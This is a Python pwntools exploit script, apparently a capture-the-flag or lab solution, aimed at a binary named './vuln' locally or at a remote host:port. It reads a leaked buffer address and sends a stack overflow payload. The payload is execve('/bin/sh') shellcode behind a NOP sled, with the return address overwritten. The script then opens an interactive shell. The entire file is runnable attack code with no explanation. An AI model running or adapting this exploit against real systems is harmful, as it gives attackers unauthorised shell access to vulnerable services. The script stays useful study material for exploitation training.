from pwn import *
import sys

context.binary = "./vuln"

elf = ELF("./vuln")

rop = ROP(elf)



def get_process():
    if len(sys.argv) == 1:
        return context.binary.process()
    elif len(sys.argv) == 2:
        addr, port = sys.argv[1].split(":")

        port = int(port)

        return remote(addr, port)

def main():
    p = get_process()

    p.recvuntil(b"Buffer address: ")
    ret_addr = int(p.recvline(), 16)
    print(f"[+] Buffer address: {hex(ret_addr)}")

    p.recvuntil(b"Enter your input: ")

    shellcode = b"\x48\xc7\xc0\x3b\x00\x00\x00\x48\xc7\xc2\x00\x00\x00\x00\x49\xb8\x2f\x62\x69\x6e\x2f\x73\x68\x00\x41\x50\x48\x89\xe7\x52\x57\x48\x89\xe6\x0f\x05\x48\xc7\xc0\x3c\x00\x00\x00\x48\xc7\xc7\x00\x00\x00\x00\x0f\x05"

    shellcode = shellcode.rjust(120, b'\x90')
    payload = shellcode + p64(ret_addr)

    p.sendline(payload)
    p.interactive()

if __name__ == "__main__":
    main()